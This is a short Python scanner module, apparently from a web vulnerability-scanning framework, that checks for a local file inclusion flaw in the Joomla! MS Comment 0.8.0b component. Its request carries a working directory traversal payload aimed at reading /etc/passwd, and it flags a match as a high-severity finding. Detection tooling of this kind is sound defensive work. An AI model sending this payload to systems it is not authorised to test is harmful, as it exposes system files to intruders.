#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A directory traversal vulnerability in the Moron Solutions MS Comment (com_mscomment) component 0."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Joomla! Component MS Comment 0.8.0b - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2010', 'joomla', 'lfi', 'edb', 'packetstorm', 'm0r0n', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../etc/passwd%00', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Joomla! Component MS Comment 0.8.0b - Local File Inclusion detected",
                path='/index.php?option=com_mscomment&controller=../../../../../../../../../../../../../../../etc/passwd%00',
            )
            return True
        return False
